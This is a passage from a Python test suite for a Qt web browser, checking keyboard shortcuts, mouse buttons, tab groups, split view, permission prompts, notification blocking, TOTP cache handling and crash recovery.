jsq(_v258, "(function(){var h=document.createElement('div');"
           "h.id='h258';document.body.appendChild(h);"
           "var r=h.attachShadow({mode:'open'});"
           "var i=document.createElement('input');r.appendChild(i);"
           "window.seen258=0;"
           "i.addEventListener('keydown',function(){window.seen258++});"
           "i.focus();return 1})()")
_w258 = _v258.focusProxy() or _v258
_w258.setFocus()
H.spin(150)
_QT258.keyClick(_w258, B.Qt.Key.Key_J)
H.spin(300)
_got258 = jsq(_v258, "[document.getElementById('h258').shadowRoot"
                     ".firstChild.value, window.seen258]")
check("256 a letter typed in a shadow-root input is kept, and the page's own "
      "handler on it still runs (vim keys and noKeyGrab on)",
      _got258 == ["j", 1], str(_got258))
H.load(_v258, srv.url("/twhome?g258"))
H.spin(800)
jsq(_v258, "document.activeElement && document.activeElement.blur()")
_w258 = _v258.focusProxy() or _v258
_w258.setFocus()
H.spin(150)
jsq(_v258, "window.__navTabStep = 0", B.APP_WORLD_ID)
_QT258.keyClick(_w258, B.Qt.Key.Key_G)
_QT258.keyPress(_w258, B.Qt.Key.Key_Shift)
# the character itself: Key_T with Shift sends the text "t" (a gt), while
# a real Shift+T sends "T"
_QT258.keyClick(_w258, "T", B.Qt.KeyboardModifier.ShiftModifier)
_QT258.keyRelease(_w258, B.Qt.Key.Key_Shift)
# the keys reach the page's script a moment later, under load more so
H.wait_for(lambda: jsq(_v258, "window.__navTabStep", B.APP_WORLD_ID) == -1,
           3000)
_step258 = jsq(_v258, "window.__navTabStep", B.APP_WORLD_ID)
check("256 gT: the Shift key's own keydown does not clear the pending g",
      _step258 == -1, str(_step258))
br.config["vimKeys"] = _vim_was258
if _nav_was258 is None:
    br.config.pop("nav", None)
else:
    br.config["nav"] = _nav_was258
br.refresh_nav()
_close_if_open(_v258)

# 256: a key a site keeps is declined as a shortcut (ShortcutOverride accepted)
_kt_was258 = br.config.get("keysThrough")
_kv258 = br.new_tab(url=srv.url("/twhome?kt258"), switch=False)
H.wait_for(lambda: "kt258" in _kv258.url().toString(), 8000)
H.spin(200)
_host258 = br._host_of(_kv258.url())
br.config["keysThrough"] = {_host258: ["Ctrl+K"]}
_mw258 = B.MouseWatch(br)
_o258 = _QO258()
_mw258.views[_o258] = _kv258
_res258 = []
for _key258 in (B.Qt.Key.Key_K, B.Qt.Key.Key_J):
    _ev258 = _QKE258(B.QEvent.Type.ShortcutOverride, _key258,
                     B.Qt.KeyboardModifier.ControlModifier)
    _ev258.ignore()
    _res258.append((bool(_mw258._watch(_o258, _ev258)), _ev258.isAccepted()))
if _kt_was258 is None:
    br.config.pop("keysThrough", None)
else:
    br.config["keysThrough"] = _kt_was258
_close_if_open(_kv258)
check("256 keysThrough: the listed key is taken off the browser's shortcuts "
      "(accepted override), another key is not",
      _res258 == [(True, True), (False, False)], str(_res258))
# and the page script no longer stops the key on its way to the page
check("256 keysThrough: the page script leaves the key to the page",
      "e.stopPropagation();\n        return;\n      }\n      if ((W.guarded"
      not in B.NAV_JS)

# 257: the clash check reads keys the way Qt does
import re as _re258
_html258 = (_Path(B.__file__).parent / "settings.html").read_text()
_m258 = _re258.search(r"  const normKey = \(text\) => \{.*?\n  \};\n",
                      _html258, _re258.S)
_kn258 = None
if _m258:
    _kv2 = br.new_tab(url=srv.url("/twhome?n258"), switch=False)
    H.spin(500)
    _kn258 = jsq(_kv2, "(function(){" + _m258.group(0)
                 + "return [normKey('shift+ctrl+t'), normKey('Ctrl+Shift+T'),"
                   "normKey('Ctrl++'), normKey('Ctrl+T')]})()")
    _close_if_open(_kv2)
check("257 settings: Ctrl+Shift+T and shift+ctrl+t are one key, Ctrl+T is not",
      _kn258 is not None and _kn258[0] == _kn258[1] != _kn258[3]
      and _kn258[2] != _kn258[3] and "normKey(want)" in _html258,
      str(_kn258))
_sc_was258 = br.config.get("shortcuts")
_flashed258 = []
br.__dict__["flash"] = lambda text, ms=2600: _flashed258.append(str(text))
try:
    # reopen takes newtab's Ctrl+T: one of the two cannot have it
    br.config["shortcuts"] = {"reopen": "Ctrl+T"}
    br.rebind_shortcuts()
finally:
    br.__dict__.pop("flash", None)
    if _sc_was258 is None:
        br.config.pop("shortcuts", None)
    else:
        br.config["shortcuts"] = _sc_was258
    br.rebind_shortcuts()
_said258 = br._ui_str("keyClashSkipped").split("%s")[0]
check("257 a key given to an action that another already has is said, once",
      len([t for t in _flashed258 if _said258 in t]) == 1, str(_flashed258))
_ko_was258 = br.config.get("keysOffHere")
br.config["keysOffHere"] = {"example.com": ["a"], "app.example.com": ["b"],
                            "WWW.Other.com": ["c"]}
_off258 = (br.site_keys_off("app.example.com"), br.site_keys_off("x.example.com"),
           br.site_keys_off("other.com"))
if _ko_was258 is None:
    br.config.pop("keysOffHere", None)
else:
    br.config["keysOffHere"] = _ko_was258
check("257 site_keys_off: the most specific host wins, stored hosts are "
      "normalised", _off258 == (["b"], ["a"], ["c"]), str(_off258))

# 258: the mouse
_mg_was258 = br.config.get("mouseGestures", False)
_mb_was258 = br.config.get("mouseButtons", True)
_eb_was258 = br.config.get("extraButtons", "__absent__")
br.config["mouseGestures"] = False
br.config["mouseButtons"] = False
_mv258 = br.new_tab(url=srv.url("/twhome?m258"), switch=False)
H.spin(1500)
_tg258 = _mv258.focusProxy()
_inst258 = bool(_tg258 is not None and getattr(_tg258, "_mouse_watched", False))
_again258 = br.watch_view_mouse(_mv258)
check("258 (5) the filter is on the tabs with gestures off and the side "
      "buttons switched off", _inst258 and _again258 is True,
      str((_inst258, _again258)))
br.config["mouseButtons"] = True
br.config["extraButtons"] = {"XButton1": "reload"}
_mw258b = B.MouseWatch(br)
_ob258 = _QO258()
_mw258b.views[_ob258] = _mv258
_acts258 = []
br.run_mouse_act = lambda act, view=None: _acts258.append(act) or act
_r258 = []
try:
    for _kind258 in (B.QEvent.Type.MouseButtonPress,
                     B.QEvent.Type.MouseButtonRelease):
        _e258 = _QME258(_kind258, _QPF258(5, 5), _QPF258(5, 5),
                        B.Qt.MouseButton.XButton1, B.Qt.MouseButton.NoButton,
                        B.Qt.KeyboardModifier.NoModifier)
        _r258.append(bool(_mw258b._watch(_ob258, _e258)))
finally:
    br.__dict__.pop("run_mouse_act", None)
check("258 (5, 6) a spare button's action runs without gestures, press and "
      "release are both held back, the action runs once",
      _r258 == [True, True] and _acts258 == ["reload"],
      str((_r258, _acts258)))
br.config["mouseGestures"] = _mg_was258
br.config["mouseButtons"] = _mb_was258
if _eb_was258 == "__absent__":
    br.config.pop("extraButtons", None)
else:
    br.config["extraButtons"] = _eb_was258
_close_if_open(_mv258)

class _Br258:
    def __init__(self):
        self.opened = []
        self.browser = self

    def open_pin(self, url, **kw):
        self.opened.append(url)


class _Fake258:
    def __init__(self):
        self.browser = _Br258()

    def more_cell(self):
        return None

    def hit(self, point):
        return {"url": "https://pin258.example/"}


_f258 = _Fake258()
_got7 = []
for _btn258 in (B.Qt.MouseButton.XButton1, B.Qt.MouseButton.XButton2,
                B.Qt.MouseButton.LeftButton):
    _e258 = _QME258(B.QEvent.Type.MouseButtonPress, _QPF258(5, 5),
                    _QPF258(5, 5), _btn258, _btn258,
                    B.Qt.KeyboardModifier.NoModifier)
    B.Dock.mousePressEvent(_f258, _e258)
    _got7.append(len(_f258.browser.opened))
check("258 (7) only the left button opens a dock pin",
      _got7 == [0, 0, 1], str(_got7))

_mg258 = br.config.get("mouseGestures", False)
br.config["mouseGestures"] = True
_t1258 = br.new_tab(url=srv.url("/twhome?w1"), switch=False)
_t2258 = br.new_tab(url=srv.url("/twhome?w2"), switch=True)
H.spin(400)
_mw258c = B.MouseWatch(br)
_oc258 = _QO258()
_mw258c.views[_oc258] = _t2258
_mw258c.right_down = True
_res9 = []
for _delta258 in (_QP258(120, 0), _QP258(0, 120)):
    br.tabs.setCurrentWidget(_t2258)
    _w258e = _QWE258(_QPF258(5, 5), _QPF258(5, 5), _QP258(0, 0), _delta258,
                     B.Qt.MouseButton.RightButton,
                     B.Qt.KeyboardModifier.NoModifier,
                     B.Qt.ScrollPhase.NoScrollPhase, False)
    _mw258c.right_down = True
    _eaten = bool(_mw258c._watch(_oc258, _w258e))
    _res9.append((_eaten, br.current() is _t2258))
br.tabs.setCurrentWidget(_t2258)
_close_if_open(_t1258)
_close_if_open(_t2258)
br.config["mouseGestures"] = _mg258
check("258 (9) a sideways wheel with the right button held is no tab switch; "
      "an up/down one still is",
      _res9 == [(False, True), (True, False)], str(_res9))

_mw258d = B.MouseWatch(br)
_od258 = _QO258()
_vd258 = br.new_tab(url=srv.url("/twhome?c258"), switch=False)
_mw258d.views[_od258] = _vd258
_mg258 = br.config.get("mouseGestures", False)
br.config["mouseGestures"] = True
_res10 = []
for _why258 in (_QCM258.Reason.Keyboard, _QCM258.Reason.Mouse):
    _mw258d.did_gesture = True
    _cm258 = _QCM258(_why258, _QP258(3, 3))
    _res10.append((bool(_mw258d._watch(_od258, _cm258)), _mw258d.did_gesture))
br.config["mouseGestures"] = _mg258
_close_if_open(_vd258)
check("258 (10) the Menu key after a gesture still opens the menu; the "
      "mouse's own menu request after one is swallowed",
      _res10 == [(False, False), (True, False)], str(_res10))

# ---- 257b: the clash message names the action left without the key, once ----
_sc_was257b = br.config.get("shortcuts")
_fl257b = []
br.__dict__["flash"] = lambda text, ms=2600: _fl257b.append(str(text))
try:
    br.__dict__.pop("_clash_said", None)
    # newtab (early in the list) takes reopen's Ctrl+Shift+T: reopen loses it
    br.config["shortcuts"] = {"newtab": "Ctrl+Shift+T"}
    br.rebind_shortcuts()
    br.rebind_shortcuts()
finally:
    br.__dict__.pop("flash", None)
    if _sc_was257b is None:
        br.config.pop("shortcuts", None)
    else:
        br.config["shortcuts"] = _sc_was257b
    br.rebind_shortcuts()
_reopen257b = br._ui_str("actReopen")
_newtab257b = br._ui_str("actNewTab")
check("257b the clash message names the action that lost the key, and only once",
      len(_fl257b) == 1 and _reopen257b in _fl257b[0]
      and _newtab257b not in _fl257b[0], str(_fl257b))


# ---- 259: tab groups, the 48th pass: names, sessions, the move to a window ----
def _end259(win):
    """A second window the section opened, closed without asking."""
    try:
        win._closing_anyway = True
        win.close()
    except RuntimeError:
        pass


def _idx259(win, view):
    try:
        return win.tabs.indexOf(view)
    except RuntimeError:
        return -1


_NONE259 = object()
_cfg259 = {k: br.config.get(k, _NONE259) for k in
           ("tabGroups", "sessionTabs", "sessions")}

# 1: the tab for "Add tab to new group" is found again after the prompt
_w259 = br.new_window()
try:
    H.spin(300)
    _x259 = _w259.new_tab(url=None, switch=False)
    _at259 = _w259.tabs.indexOf(_x259)

    def _ask259():
        _w259.close_tab(_w259.tabs.indexOf(_x259), ask=False)
        return ("G259a", "#89b4fa")

    _w259._prompt_group = _ask259
    _err259 = None
    try:
        try:
            _w259._tab_to_new_group(_x259)
        except TypeError:
            _w259._tab_to_new_group(_at259)    # the old, index-taking form
    except Exception as e:
        _err259 = repr(e)[:80]
    H.spin(100)
    check("259 a tab closed under the group prompt leaves no empty header",
          _err259 is None and "G259a" not in _w259.groups
          and _w259._header_index("G259a") is None,
          str((_err259, list(_w259.groups))))
finally:
    _w259.__dict__.pop("_prompt_group", None)
    _end259(_w259)

# 2: "group selection" never joins another virtual browser's group
_w259 = br.new_window()
try:
    H.spin(300)
    _w259._register_group("W259", "#a6e3a1", session="x259")
    _v259 = _w259.new_tab(url=None, switch=False)
    _got259 = _w259.ensure_group("W259")
    _w259._move_tab_to_group(_w259.tabs.indexOf(_v259), "W259")
    check("259 ensure_group and _move_tab_to_group keep to the tab's browser",
          _got259 != "W259"
          and _w259.group_sessions.get(_got259) == _w259.active_session
          and getattr(_v259, "group", None) is None
          and _w259.group_sessions.get("W259") == "x259",
          str((_got259, getattr(_v259, "group", None))))
finally:
    _end259(_w259)

# 3: two windows' same-named groups in different browsers stay two groups
_wa259 = br.new_window()
_wb259 = br.new_window()
_wr259 = br.new_window()
_sid259 = {"name": "T259", "sid": "x259"}
try:
    H.spin(300)
    _cap259 = {}
    _wa259._session_rows = lambda: ([{
        "name": "S259", "color": "#89b4fa", "collapsed": False,
        "gid": None, "session": "main",
        "urls": [{"u": "http://a259.example/", "t": "a"}]}], {})
    _wb259._session_rows = lambda: ([{
        "name": "S259", "color": "#f38ba8", "collapsed": False,
        "gid": None, "session": "x259",
        "urls": [{"u": "http://b259.example/", "t": "b"}]}], {})
    _wa259._write_session_state = lambda d, s, quiet=False: _cap259.update(
        d=d)
    _wa259._save_groups()
    _rows259 = [e for e in _cap259.get("d", []) if e.get("name") == "S259"]
    check("259 same-named groups of two browsers are saved as two entries",
          len(_rows259) == 2
          and {e.get("session") for e in _rows259} == {"main", "x259"}
          and all(len(e["urls"]) == 1 for e in _rows259),
          str([(e.get("session"), len(e["urls"])) for e in _rows259]))
    # ...and come back as two groups, each tab opened in its own browser
    _opened259 = []
    _wr259.sessions.append(_sid259)
    _wr259.new_tab = lambda *a, **k: _opened259.append(
        (k.get("group"), k.get("session"))) or None
    br.config["tabGroups"] = _rows259
    _wr259._restore_groups()
    _gs259 = {g: _wr259.group_sessions.get(g) for g in _wr259.groups}
    check("259 two saved groups of one name come back as two, in their own "
          "browsers",
          len(_gs259) == 2 and set(_gs259.values()) == {"main", "x259"}
          and sorted(_opened259, key=str)
          == sorted(((g, s) for g, s in _gs259.items()), key=str),
          str((_gs259, _opened259)))
finally:
    for _w in (_wa259, _wb259):
        _w.__dict__.pop("_session_rows", None)
    _wa259.__dict__.pop("_write_session_state", None)
    _wr259.__dict__.pop("new_tab", None)
    try:
        _wr259.sessions.remove(_sid259)
    except ValueError:
        pass
    for _k, _o in _cfg259.items():
        if _o is _NONE259:
            br.config.pop(_k, None)
        else:
            br.config[_k] = _o
    for _w in (_wa259, _wb259, _wr259):
        _end259(_w)

# 7: moving a group to a window closes only the tabs that were carried
_wg259 = br.new_window()
_win259 = None
try:
    H.spin(300)
    _wg259._register_group("G259", "#cba6f7")
    _pa259 = _wg259.new_tab(url=B.QUrl(srv.url("/twhome")), switch=False,
                            group="G259", at_end=True)
    _pb259 = _wg259.new_tab(url=None, switch=False, group="G259",
                            at_end=True)
    H.wait_for(lambda: "/twhome" in _pa259.url().toString(), 8000)
    H.spin(200)
    _skipped259 = len(_wg259.tab_state(
        indices={_wg259.tabs.indexOf(_pb259)})) == 0
    _win259 = _wg259.move_group_to_window("G259")
    H.spin(300)
    _left259 = (_idx259(_wg259, _pb259) >= 0
                and getattr(_pb259, "group", None) == "G259")
    _gone259 = _idx259(_wg259, _pa259) < 0
    # a group holding only tabs that cannot be carried is not closed
    _wg259._register_group("E259", "#fab387")
    _pc259 = _wg259.new_tab(url=None, switch=False, group="E259",
                            at_end=True)
    _none259 = _wg259.move_group_to_window("E259")
    check("259 move_group_to_window keeps the tabs that were not carried",
          _skipped259 and _win259 is not None and _left259 and _gone259
          and _none259 is None and _idx259(_wg259, _pc259) >= 0,
          str((_skipped259, _win259 is not None, _left259, _gone259,
               _none259, _idx259(_wg259, _pc259))))
finally:
    if _win259 is not None:
        _end259(_win259)
    _end259(_wg259)
H.spin(100)

# ---- 260: split view, the 48th pass: the last tab, a group's last tab, the way back ----
def _mk260():
    w = br.new_window()
    H.spin(300)
    w.show()
    return w


# 4: closing the last strip tab beside a split keeps the window and the half
_w260 = _mk260()
try:
    _t0 = _w260.current()
    _t1 = _w260.new_tab(url=None, switch=False)
    _w260.split_view(index=_w260.tabs.indexOf(_t1))
    H.spin(300)
    _split260 = _w260._split_view is _t1
    _w260._closing_anyway = True
    _w260.close_tab(_w260.tabs.indexOf(_t0), ask=False)
    H.spin(200)
    try:
        _up260 = (_w260 in B.WINDOWS and _w260.isVisible()
                  and _w260.tabs.indexOf(_t1) >= 0)
    except RuntimeError:
        _up260 = False
    check("260 closing the last strip tab beside a split keeps the window",
          _split260 and _up260, str((_split260, _up260)))
finally:
    _end259(_w260)
H.spin(100)

# 5: a group whose only member left is the split half is not deleted
_w260 = _mk260()
try:
    _w260._register_group("G260", "#89b4fa")
    _a260 = _w260.new_tab(url=None, switch=True, group="G260", at_end=True)
    _b260 = _w260.new_tab(url=None, switch=False, group="G260", at_end=True)
    _w260.tabs.setCurrentIndex(_w260.tabs.indexOf(_a260))
    _w260.split_view(index=_w260.tabs.indexOf(_b260))
    H.spin(300)
    _split260 = _w260._split_view is _b260
    _w260.close_tab(_w260.tabs.indexOf(_a260), ask=False)
    H.spin(200)
    _kept260 = ("G260" in _w260.groups
                and _w260._header_index("G260") is not None
                and "G260" in _w260.group_colors)
    _w260.close_split()
    H.spin(100)
    _h260 = _w260._header_index("G260")
    check("260 the group stays while its split half is its last tab",
          _split260 and _kept260 and _h260 is not None
          and _w260.tabs.indexOf(_b260) == _h260 + 1
          and getattr(_b260, "group", None) == "G260",
          str((_split260, _kept260, _h260, _w260.tabs.indexOf(_b260))))
finally:
    _end259(_w260)
H.spin(100)

# 6: the split half goes back to the end of its group's run
_w260 = _mk260()
try:
    _t0 = _w260.current()
    _w260._register_group("G260", "#89b4fa")
    _a260 = _w260.new_tab(url=None, switch=True, group="G260", at_end=True)
    _b260 = _w260.new_tab(url=None, switch=False, group="G260", at_end=True)
    _t9 = _w260.new_tab(url=None, switch=False, group=None, at_end=True)
    _w260.tabs.setCurrentIndex(_w260.tabs.indexOf(_a260))
    _w260.split_view(index=_w260.tabs.indexOf(_b260))
    H.spin(300)
    _split260 = _w260._split_view is _b260
    # while it is out: another group in front, taking two loose tabs
    _w260._register_group("H260", "#f38ba8", at=0)
    for _v in (_t0, _t9):
        _w260._move_tab_to_group(_w260.tabs.indexOf(_v), "H260")
    _w260.close_split()
    H.spin(100)
    _hg260 = _w260._header_index("G260")
    _gi260 = _w260._group_indices("G260")
    _hi260 = _w260._group_indices("H260")
    check("260 close_split puts a grouped tab at the end of its group's run",
          _split260 and _hg260 is not None
          and _gi260 == [_hg260 + 1, _hg260 + 2] and len(_hi260) == 2
          and _hi260 == list(range(_w260._header_index("H260") + 1,
                                   _w260._header_index("H260") + 3))
          and getattr(_b260, "group", None) == "G260",
          str((_split260, _hg260, _gi260, _hi260)))
finally:
    _end259(_w260)
H.spin(100)

# ---- 261: the permission card waits a moment; blocked notifications stay blocked ----
class _Perm261:
    def __init__(self):
        self.answered = ""

    def grant(self):
        self.answered = "grant"

    def deny(self):
        self.answered = "deny"


_perms_was261 = json.loads(json.dumps(br.config.get("permissions") or {}))
_p261 = _Perm261()
_k261 = "https://p261.example|use the camera"
br._request_is_live = lambda page: True
try:
    br._perm_queue.append((_p261, None, "p261.example", "use the camera",
                           _k261, _k261.split("|")[0], True, False))
    br._next_permission()
    _card261 = br._perm_widget
    _allow261 = (_card261.findChild(B.QToolButton, "permallow")
                 if _card261 is not None else None)
    if _allow261 is not None:
        _allow261.click()           # at once: must not count
    _early261 = _p261.answered
    H.wait_for(lambda: _allow261 is not None and _allow261.isEnabled(), 3000)
    if _allow261 is not None and br._perm_widget is _card261:
        _card261.findChild(B.QToolButton, "permdeny").click()
    H.spin(100)
    _late261 = _p261.answered
finally:
    br.__dict__.pop("_request_is_live", None)
    br.config["permissions"] = _perms_was261
    br._session_perms.pop(_k261, None)
check("261 a new permission card ignores a click in its first moment",
      _allow261 is not None and _early261 == "" and _late261 == "deny",
      str((_allow261 is not None, _early261, _late261)))


class _Note261:
    def __init__(self):
        self.closed = 0

    def origin(self):
        return B.QUrl("https://n261.example/")

    def title(self):
        return "ping261"

    def message(self):
        return "body"

    def close(self):
        self.closed += 1

    def show(self):
        pass


_bn_was261 = br.config.get("blockNotifications")
_log_was261 = json.loads(json.dumps(br.config.get("notifyLog") or []))
_flash261 = []
br.flash = lambda *a, **k: _flash261.append(a)
br.notify_desktop = lambda *a, **k: _flash261.append(("desk",) + a)
try:
    br.config["blockNotifications"] = True
    _n261 = _Note261()
    _shown261 = br._web_notification(_n261)
finally:
    br.__dict__.pop("flash", None)
    br.__dict__.pop("notify_desktop", None)
    if _bn_was261 is None:
        br.config.pop("blockNotifications", None)
    else:
        br.config["blockNotifications"] = _bn_was261
    _logged261 = any("ping261" in json.dumps(r)
                     for r in br.config.get("notifyLog") or [])
    br.config["notifyLog"] = _log_was261
check("261 with notifications blocked, a site that already may is silent",
      not _shown261 and _n261.closed == 1 and not _flash261
      and not _logged261, str((_shown261, _n261.closed, _flash261,
                               _logged261)))

# ---- 259b: stacking a site beside another browser's group of that name ----
_w259b = br.new_window()
H.spin(800)
try:
    _w259b._register_group("127.0.0.1", B.GROUP_COLORS[1][1],
                           session="other259b")
    _ta259b = _w259b.new_tab(url=srv.url("/twhome?s259b"), switch=False)
    _tb259b = _w259b.new_tab(url=srv.url("/twother?s259b"), switch=False)
    H.wait_for(lambda: "s259b" in _ta259b.url().toString()
               and "s259b" in _tb259b.url().toString(), 8000)
    _w259b.flash = lambda *a, **k: None
    _name259b = _w259b.stack_site_tabs(host="127.0.0.1")
    _groups259b = (_w259b._group_of(_ta259b), _w259b._group_of(_tb259b))
    _sess259b = _w259b.group_sessions.get(_name259b)
finally:
    _w259b._confirm_many_tabs = lambda *a, **k: True
    _w259b.close()
    H.spin(500)
check("259b stacking a site keeps to this browser's own group of that name",
      _name259b and _name259b != "127.0.0.1"
      and _groups259b == (_name259b, _name259b)
      and _sess259b == _w259b.active_session,
      str((_name259b, _groups259b, _sess259b)))

# the clash message comes back when the clash does
_sc_was259b = br.config.get("shortcuts")
_fl259b = []
br.__dict__["flash"] = lambda text, ms=2600: _fl259b.append(str(text))
try:
    br.__dict__.pop("_clash_said", None)
    br.config["shortcuts"] = {"newtab": "Ctrl+Shift+T"}
    br.rebind_shortcuts()
    br.config["shortcuts"] = {}
    br.rebind_shortcuts()
    br.config["shortcuts"] = {"newtab": "Ctrl+Shift+T"}
    br.rebind_shortcuts()
finally:
    br.__dict__.pop("flash", None)
    if _sc_was259b is None:
        br.config.pop("shortcuts", None)
    else:
        br.config["shortcuts"] = _sc_was259b
    br.rebind_shortcuts()
check("259b a clash cleared and made again is said again",
      len(_fl259b) == 2, str(_fl259b))


# ---- 262/263: own pages, the 51st pass: lost clicks, dead store button, TOTP after an edit, notes ----
_dir262 = _Path(B.__file__).parent
_dl262 = (_dir262 / "downloads.html").read_text()
_pw262 = (_dir262 / "passwords.html").read_text()
_nt263 = (_dir262 / "notes.html").read_text()

# page-level source checks: these pages only run inside a bridge, so the exact guards are checked
check("262 downloads: no redraw under a held pointer button, none for an unchanged answer",
      'document.addEventListener("pointerdown"' in _dl262
      and "if (held) { deferred = true; return; }" in _dl262
      and "if (j === lastJson) return;" in _dl262
      and "if (deferred) { deferred = false; refresh(); }" in _dl262)
check("262 passwords: a lock, a denial or a timeout frees the store button",
      "function pickerReset()" in _pw262
      and "setTimeout(pickerReset, 30000)" in _pw262
      and _pw262.count("pickerReset();") >= 3
      and "function renderLocked() {\n  pickerReset();" in _pw262
      and "function renderDenied() {\n  pickerReset();" in _pw262)
check("263 notes: adding a snippet with no text is not a delete",
      "if (!key.value.trim() || !text.value) return;" in _nt263)
check("263 notes: Back, a tab, a new note and Esc save a typed-in note first",
      "function leaveNote(then)" in _nt263
      and "back.onclick = () => leaveNote(" in _nt263
      and "function setView(which) {\n    leaveNote(" in _nt263
      and "leaveNote(() => bridge.closePane())" in _nt263
      and "leaveNote(() => desk(\"daily\"" in _nt263
      and 'addEventListener("input", () => { dirty = true; })' in _nt263)

# TOTP: a save or delete forgets the cached code and a fetch from before it lands nowhere
if br.vault is not None and not br.vault_locked():
    _jobs262 = []
    _real_job262 = br.vault_job
    br.vault.provider.eager = False      # shadows the class's True
    br.vault_job = lambda work, done: _jobs262.append((work, done))
    _old262 = {"code": "111111", "period": 30, "left": 20.0}
    try:
        _k262 = br._page_key
        # a code cached, then the item saved: the next ask goes to the store again
        json.loads(br.bridge.totpFor(_k262, "it262a"))
        _jobs262[0][1](_old262)
        _hit262 = json.loads(br.bridge.totpFor(_k262, "it262a"))
        br.bridge.saveItem(_k262, json.dumps({"id": "it262a", "title": "t"}))
        _after262 = json.loads(br.bridge.totpFor(_k262, "it262a"))
        # a fetch out when the save lands must not write its old answer
        del _jobs262[:]
        json.loads(br.bridge.totpFor(_k262, "it262b"))
        _stale = _jobs262[0]
        br.bridge.saveItem(_k262, json.dumps({"id": "it262b", "title": "t"}))
        _stale[1](_old262)
        _late262 = json.loads(br.bridge.totpFor(_k262, "it262b"))
        # delete forgets too
        json.loads(br.bridge.totpFor(_k262, "it262c"))
        _jobs262[-1][1](_old262)
        br.bridge.deleteItem(_k262, "it262c")
        _del262 = json.loads(br.bridge.totpFor(_k262, "it262c"))
    finally:
        br.vault_job = _real_job262
        del br.vault.provider.eager
        for _n262 in ("_totp_cache", "_totp_flight"):
            br.bridge.__dict__.get(_n262, {}).clear()
    check("262 a saved item's cached TOTP code is dropped, not shown for 30 s",
          _hit262.get("code") == "111111" and "pending" in _after262
          and "code" not in _after262, str((_hit262, _after262)))
    check("262 a TOTP fetch from before a save does not land in the cache",
          "pending" in _late262 and "code" not in _late262, str(_late262))
    check("262 a deleted item's cached TOTP code is dropped",
          "pending" in _del262 and "code" not in _del262, str(_del262))
else:
    check("262 TOTP forget on save and delete", False, "vault not open in this run")

# ---- 264: the inspector over the debug port attaches to this tab or to none ----
class _Reply264:
    def __init__(self, rows):
        self._rows = rows

    def readAll(self):
        return json.dumps(self._rows).encode()

    def deleteLater(self):
        pass


_port_was264 = B.REMOTE_DEBUG_PORT
B.REMOTE_DEBUG_PORT = 9 if not _port_was264 else _port_was264
_loaded264 = []
_v264 = br.new_tab(url=srv.url("/twhome?i264"), switch=False)
H.wait_for(lambda: "i264" in _v264.url().toString(), 8000)
_u264 = _v264.url().toString()
try:
    for _rows264 in (
            [{"type": "page", "url": "https://other264.example/",
              "devtoolsFrontendUrl": "/devtools/inspector.html?ws=OTHER"},
             {"type": "page", "url": _u264,
              "devtoolsFrontendUrl": "/devtools/inspector.html?ws=MINE"}],
            [{"type": "page", "url": _u264,
              "devtoolsFrontendUrl": "/devtools/inspector.html?ws=A"},
             {"type": "page", "url": _u264,
              "devtoolsFrontendUrl": "/devtools/inspector.html?ws=B"}],
            [{"type": "page", "url": "https://private264.example/",
              "devtoolsFrontendUrl": "/devtools/inspector.html?ws=PRIV"}]):
        br._open_inspector(_Reply264(_rows264), _v264, _u264)
        _dt264 = getattr(_v264, "_devtools", None)
        _loaded264.append(_dt264.page().requestedUrl().toString() if _dt264 is not None
                          else "")
        if _dt264 is not None:
            _dt264.close()
            _v264._devtools = None
        H.spin(100)
finally:
    B.REMOTE_DEBUG_PORT = _port_was264
    _close_if_open(_v264)
check("264 the port inspector picks this tab, and the list when it cannot tell",
      len(_loaded264) == 3 and "ws=MINE" in _loaded264[0]
      and "ws=" not in _loaded264[1] and "ws=" not in _loaded264[2],
      str(_loaded264))


# ---- 265/266: the 53rd pass: session file, crash recovery, closing a browser ----
def _mk266():
    w = br.new_window()
    H.spin(300)
    w.show()
    return w


def _end266(win):
    try:
        win._closing_anyway = True
        win.close()
    except RuntimeError:
        pass


# 265 the crash offer lists every tab, not the first sixty
_cs265 = br.__dict__.get("_crash_state", "__absent__")
_box265 = None
try:
    br._crash_state = [{"u": "http://127.0.0.1/t265-%d" % i, "t": "T%d" % i,
                        "s": "main"} for i in range(100)]
    _box265 = br.crash_recovery_dialog()
    _got265 = []
    br.open_tab_state = lambda entries, **k: _got265.append(len(entries)) or []
    try:
        _box265._bring_back()
    finally:
        br.__dict__.pop("open_tab_state", None)
    check("265 the crash offer has a box for every one of 100 tabs and "
          "brings them all back",
          len(_box265._boxes) == 100 and _got265 == [100],
          str((len(_box265._boxes), _got265)))
finally:
    if _cs265 == "__absent__":
        br.__dict__.pop("_crash_state", None)
    else:
        br._crash_state = _cs265
    if _box265 is not None:
        _box265.deleteLater()

# 265 a crashed run forgets the Downloads list when main was set to
_coe265 = br.config.get("clearOnExit", "__absent__")
_dl265 = br.downloads
try:
    br.config["clearOnExit"] = {"work265": ["downloads"]}
    br.downloads = [{"state": "done", "name": "f265", "url": "http://x/f265"}]
    try:
        br._forget_crashed_downloads()
    except AttributeError:
        pass
    _other265 = len(br.downloads) == 1       # another browser's: kept
    br.config["clearOnExit"] = {"main": ["downloads"]}
    try:
        br._forget_crashed_downloads()
    except AttributeError:
        pass
    check("265 a crash honours forgetting the Downloads list on exit",
          _other265 and br.downloads == [], str((_other265, br.downloads)))
finally:
    br.downloads = _dl265
    if _coe265 == "__absent__":
        br.config.pop("clearOnExit", None)
    else:
        br.config["clearOnExit"] = _coe265
    br.save_downloads()

# 265 a pinned tab restored first does not write a half-restored session
_w265 = None
_st265 = br.config.get("sessionTabs", "__absent__")
_tg265 = br.config.get("tabGroups", "__absent__")
_w265 = _mk266()
try:
    _writes265 = []
    _w265._write_session_state = lambda data, tabs, quiet=False: \
        _writes265.append(sum(len(v) for v in tabs.values())
                          + sum(len(g.get("urls", [])) for g in data))
    br.config["tabGroups"] = []
    br.config["sessionTabs"] = {"main": [
        {"u": srv.url("/twhome?p265"), "t": "a", "p": 1},
        {"u": srv.url("/twhome?q265"), "t": "b"},
        {"u": srv.url("/twother?r265"), "t": "c"}]}
    if hasattr(_w265, "_restore_all_tabs"):
        _w265._restore_all_tabs()
    else:
        _w265._restore_groups()
        _w265._restore_session_tabs()
    _rows265 = (lambda d, t: sum(len(v) for v in t.values())
                + sum(len(g.get("urls", [])) for g in d))
    _full265 = _rows265(*_w265._session_rows())
    # the writer adds the other windows' tabs to this one's (the suite's
    # own window has tabs of its own by now): those are counted too
    _others265 = 0
    for _ow265 in _w265.windows():
        if _ow265 is _w265 or getattr(_ow265, "_app_url", None) \
                or getattr(_ow265, "_all_private", False):
            continue
        try:
            _others265 += _rows265(*_ow265._session_rows())
        except RuntimeError:
            pass
    check("265 no session write while a restore is half done",
